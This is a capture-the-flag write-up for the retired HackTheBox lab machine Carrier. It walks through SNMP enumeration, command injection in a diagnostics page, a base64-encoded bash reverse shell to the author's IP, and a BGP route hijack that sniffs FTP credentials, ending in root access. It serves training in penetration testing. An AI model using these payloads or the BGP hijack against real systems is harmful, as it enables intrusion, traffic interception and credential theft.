# Carrier

This is the write-up for the box Carrier that got retired at the 16th March 2019.
My IP address was 10.10.14.17 while I did this.

Let's put this in our hosts file:
```markdown
10.10.10.105    carrier.htb
```

## Enumeration

Starting with a Nmap scan:

```markdown
nmap -sC -sV -o nmap/carrier.nmap 10.10.10.105
```

```markdown
PORT   STATE    SERVICE VERSION
21/tcp filtered ftp
22/tcp open     ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 15:a4:28:77:ee:13:07:06:34:09:86:fd:6f:cc:4c:e2 (RSA)
|   256 37:be:de:07:0f:10:bb:2b:b5:85:f7:9d:92:5e:83:25 (ECDSA)
|_  256 89:5a:ee:1c:22:02:d2:13:40:f2:45:2e:70:45:b0:c4 (ED25519)
80/tcp open     http    Apache httpd 2.4.18 ((Ubuntu))
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Login
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

UDP port scan:
```markdown
nmap -sU 10.10.10.105
```
```markdown
PORT    STATE         SERVICE
67/udp  open|filtered dhcps
161/udp open|filtered snmp
```

Noteworthy:
- FTP is filtered and thus there is some firewall inbetween
- OpenSSH 7.6p1 belongs to Ubuntu Bionic Beaver
- Apache 2.4.18 belongs to Ubuntu Xenial

This means that there is a mismatch in distribution versions and eventually some virtualization running in the background.

## Checking HTTP (Port 80)

On the web page is a login form to an application called **Lyghtspeed** and it shows two error codes:

![Lyghtspeed login form](https://kyuu-ji.github.io/htb-write-up/carrier/carrier_web-1.png)

Searching the Internet does not find anything about this application, so it is most likely a custom application.
Lets search for hidden directories with **Gobuster**:
```markdown
gobuster -u http://10.10.10.105 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

It finds some interesting directories:
- _/tools_

This directory is an index page with one file called _remote.php_.
When clicking on it, it shows a message:
```markdown
License expired, exiting...
```

- _/doc_

This directory is an index page with two files _diagram_for_tac.png_ and _error_codes.pdf_. The image file shows some network information:

![Diagram for tac](https://kyuu-ji.github.io/htb-write-up/carrier/carrier_web-2.png)

The PDF file seems to be a manual for the **Lyghtspeed Management Platform** and shows descriptions to error codes:

![Lyghtspeed manual](https://kyuu-ji.github.io/htb-write-up/carrier/carrier_web-3.png)

So error code _45007_ says that the certificate is invalid or expired, which explains why _remote.php_ did not work.
The error code _45009_ says that the password for _admin_ is the chassis serial number, which could be found in the SNMP strings.

### Checking SNMP (Port 161)

Lets enumerate the default _SNMP community string "public"_:
```markdown
snmpwalk -v2c -c public 10.10.10.105
```
```markdown
SNMPv2-SMI::mib-2.47.1.1.1.1.11 = STRING: "SN#NET_45JDX23"
```

The part after the _"SN#"_ looks like the serial number.
Access is granted with the user _admin_ and _"NET_45JDX23"_.

### Getting Command Execution

After logging into the **Lyghtspeed platform**, it shows a dashboard, diagnostics and tickets menu.
Two tickets from **Castcom**, that were also in the _diagram_for_tac.png_ as AS300, are some hints for the next steps:

![Lyghtspeed tickets](https://kyuu-ji.github.io/htb-write-up/carrier/carrier_web-4.png)

- Networks:
  - 10.120.15.0/24
  - 10.120.16.0/24
  - 10.120.17.0/24
- FTP service on the 10.120.15.0/24 network, which could be the FTP service from the initial Nmap scan
- BGP: **Border Gateway Protocol** to exchange routing and reachability information among autonomous systems (AS) on the Internet

The _diagnostics menu_ has a _"Verify Status"_ button that shows some process information:

![Lyghtspeed diagnostics](https://kyuu-ji.github.io/htb-write-up/carrier/carrier_web-5.png)

After sending this to a proxy tool like **Burpsuite** and analyze it, it requests the data _"check=cXVhZ2dh"_ which Base64-decoded translates to _"quagga"_:
```markdown
echo 'cXVhZ2dh' | base64 -d
```

The software [Quagga](https://www.quagga.net/) is an Open-Source routing software that supports various routing protocols including **BGP**.
As the screenshot shows, this feature seems to filter for the word _"quagga"_ so when Base64-encoding the string _"root"_ and sending the request, it filters for that:
```markdown
POST /diag.php HTTP/1.1
(...)
check=cm9vdA==
```

This shows all processes that contain the word _root_ which means that in the background it runs `grep`.
Adding another command to the request by using a semicolon:
```markdown
echo 'root; echo "Test"' | base64
```
```markdown
POST /diag.php HTTP/1.1
(...)
check=cm9vdDsgZWNobyAiVGVzdCIK
```

The response also displays _"Test"_ and proofs command execution, so lets start a reverse shell connection:
```markdown
echo 'root; bash -i >& /dev/tcp/10.10.14.17/9001 0>&1' | base64
```
```markdown
POST /diag.php HTTP/1.1
(...)
check=cm9vdDsgYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xNy85MDAxIDA+JjEK
```

After URL-decoding the Base64-string and sending the request, the listener on my IP and port 9001 starts a reverse shell connection as _root_.
This is not the target machine yet as the `hostname` is _r1_ and `ifconfig` shows the following IP addresses:
- eth0: 10.99.64.2
- eth1: 10.78.10.1
- eth2: 10.78.11.1

The file _/proc/1/environ_ also shows that this is a **LXC container** instance:
```markdown
container=lxc
```

## Enumerating the Network

Enumerating ARP table with `arp`:
```markdown
Address           Iface
10.99.64.1        eth0
10.78.11.2        eth2
10.99.64.251      eth0
10.78.10.2        eth1
```

Enumerating network connections with `netstat -alnp`:
```markdown
127.0.0.1:2601          0.0.0.0:*         LISTEN      2872/zebra
127.0.0.1:2605          0.0.0.0:*         LISTEN      2876/bgpd
0.0.0.0:179             0.0.0.0:*         LISTEN      2876/bgpd
0.0.0.0:22              0.0.0.0:*         LISTEN      485/sshd
:::179                  :::*              LISTEN      2876/bgpd
:::22                   :::*              LISTEN      485/sshd
```

Enumerating cronjobs with `crontab -l`:
```markdown
*/10 * * * * /opt/restore.sh
```

Contents of _/opt/restore.sh_:
```markdown
systemctl stop quagga
killall vtysh
cp /etc/quagga/zebra.conf.orig /etc/quagga/zebra.conf
cp /etc/quagga/bgpd.conf.orig /etc/quagga/bgpd.conf
systemctl start quagga
```

Contents of _/etc/quagga/bgpd.conf_:
```markdown
(...)
router bgp 100
 bgp router-id 10.255.255.1
 network 10.101.8.0/21
 network 10.101.16.0/21
 redistribute connected
 neighbor 10.78.10.2 remote-as 200
 neighbor 10.78.11.2 remote-as 300
 neighbor 10.78.10.2 route-map to-as200 out
 neighbor 10.78.11.2 route-map to-as300 out
(...)
```

These are the connections that were shown in the _diagram_for_tac_.
The command _vtysh_ starts the **Quagga** shell where this configuration can also be seen. This command line is similar to Cisco devices.

Pinging the IP 10.120.15.1 with the FTP service works and 10.10.10.105 also responds back.
A better way to enumerate the network is to upload a [static Nmap binary](https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap) onto this box to scan for services.
```markdown
curl 10.10.14.17/static_nmap -o nmap

chmod +x nmap
```

Scanning for open port 21 on 10.120.15.0/24:
```markdown
./nmap -Pn -p 21 10.120.15.0/24 --open
```
```markdown
Nmap scan report for 10.120.15.10

PORT   STATE SERVICE
21/tcp open  ftp
```

It found the client 10.120.15.10 with port 21 open and connecting to the FTP service via anonymous login works, but the `dir` command responds with the _error code 500_:
```markdown
ftp 10.120.15.10

ftp> dir
500 Illegal PORT command.
```

All the information collected has something to do with **BGP** so lets attack that protocol.

## Attacking Border Gateway Protocol (BGP)

There are two networks and with the **Quagga** shell it is possible to trace which of those route to 10.120.15.10:
```markdown
vtysh
```
```markdown
r1# show ip route 10.120.15.10

Routing entry for 10.120.15.0/24
  Known via "bgp", distance 20, metric 0, best
  Last update 00:00:40 ago
  * 10.78.11.2, via eth2
```

The network 10.78.11.0/24 (AS300) routes there.

More BGP information:
```markdown
r1# show ip bgp summary

Neighbor        V   AS
10.78.10.2      4   200
10.78.11.2      4   300
```

We rename _/opt/restore.sh_ so that it does not reset our configurations and can start a **BGP Hijack** by advertising our own route:
```markdown
r1# configure t

r1(config)# router bgp 100

r1(config-router)# network 10.120.15.0/25

r1# clear ip bgp * out
```

Sniffing the traffic with `tcpdump` for FTP packets:
```markdown
tcpdump -i any -w ftp-1.pcap port 21
```

After sniffing for a little while, the PCAP file can be downloaded to our local client for analysis with **Wireshark**.
It shows the captured packets, but the TCP handshake never completes.

This happens because the route from _AS200_ sends the packets to us _(AS100)_ and forwards them from there to _AS300_ where the FTP server is.
```markdown
r1# show ip bgp neighbors 10.78.11.2 advertised-routes

Network           Next Hop
10.120.15.0/25    10.78.11.1
```

So the advertising route to _AS300_ (10.78.10.0/24) has to be blocked:
```markdown
r1# conf t

r1(config)# ip prefix-list Hijack permit 10.120.15.0/25
r1(config)# route-map to-as300 deny 5

r1(config-route-map)# match ip address prefix-list Hijack

r1# clear ip bgp * out
```

The new configurations is successfully deployed:
```markdown
r1# show running-config

(...)
ip prefix-list Hijack seq 5 permit 10.120.15.0/25
!
route-map to-as300 deny 5
 match ip address prefix-list Hijack
(...)
```

Now configuring the route to _AS200_ that when a packet reaches it, it shall not advertise the packet to anyone:
```markdown
r1# conf t

r1(config)# route-map to-as200 permit 5

r1(config-route-map)# match ip address prefix-list Hijack
r1(config-route-map)# set community no-export
r1(config-route-map)# end

r1# clear ip bgp * out
```

Sniffing the traffic with `tcpdump` for FTP packets again:
```markdown
tcpdump -i any -w ftp-2.pcap port 21
```

After sniffing for a little while, the PCAP file can be downloaded to our local client for analysis with **Wireshark**.
It shows the captured packets and FTP login credentials:

![Wireshark capture FTP credentials](https://kyuu-ji.github.io/htb-write-up/carrier/carrier_wireshark-1.png)

> BGPtelc0rout1ng

Logging in on the FTP service from the current box with _root_ and following the steps from the screenshot:
```markdown
ftp 10.120.15.10

ftp> binary
ftp> passive

ftp> dir
-r--------    1 0        0              33 Jul 01  2018 root.txt
-rw-------    1 0        0              33 Nov 28 17:33 secretdata.txt
```

The password also works on the main box 10.10.10.105 via SSH and gets us root on the box!
```markdown
ssh root@10.10.10.105
```
